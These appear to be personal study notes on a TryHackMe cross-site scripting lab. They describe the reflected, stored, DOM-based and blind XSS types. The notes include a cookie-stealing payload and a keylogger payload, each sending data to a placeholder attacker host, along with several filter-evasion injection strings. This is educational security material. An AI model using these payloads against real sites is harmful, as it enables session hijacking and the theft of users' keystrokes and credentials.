# Room
https://tryhackme.com/room/xssgi

# Task 1 - Intro
* XSS - Cross-site scripting
* an injection attack where malicious JavaScript is injected into a web app and executed by other users

# Task 2 - XSS Payloads
* Payload - JavaScript code that executes
* Payload parts
    * Intention - what you want the JavaScript code to do
    * Modification - the change you need to make it execute
* Proof of Concept
    * Simple code to test whether XSS may be possible
    * <script>alert('XSS');</script>
* Session Stealing
    * Grab a user token such as a cookie
    * <script>fetch('https://hacker.cc/steal?cookie=' + btoa(document.cookie));</script>
        * https://developer.mozilla.org/en-US/docs/Web/API/fetch
        * https://developer.mozilla.org/en-US/docs/Web/API/btoa
* Key Logger
    * Grab keystrokes as a user types
    * <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
        * https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onkeypress
* Business Logic
    * Call a built in web app function in a way it wasn't intended to change data

# Task 3 - Reflected XSS
* Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation
* Impact - the malicious link could execute code on the victim browswer revealing session information

# Task 4 - Stored XSS
* Store XSS happens when the payload is stored on the web application and is executed everytime other users visit the app
* Impact - the malicious code could redirect to another site, steal a cookie, or perform other actions

# Task 5 - DOM Based XSS
* DOM - Document Object Model
* DOM is a programming interface for HTML and XML documents, it represents a page so that programs can change the structure, style and content
* Exploit - DOM Based XSS happens directly in the browser without any new pages being loaded
* Unsafe method example: eval()

# Task 6 - Blind XSS
* Blind XSS is similar to Stored XSS, with the difference being you can't see your payload working
* Impact - steal cookies and other sensitive information
* Tools
    * https://xsshunter.com/

# Task 7 - Testing
* Step through different XSS payloads
    * <script>alert('THM');</script>
    * "><script>alert('THM');</script>
    * </textarea><script>alert('THM');</script>
    * ';alert('THM');//
    * <sscriptcript>alert('THM');</sscriptcript>
    * /images/cat.jpg" onload="alert('THM');

# Task 8 - Blind XSS Example
* Step through the Blind XSS Example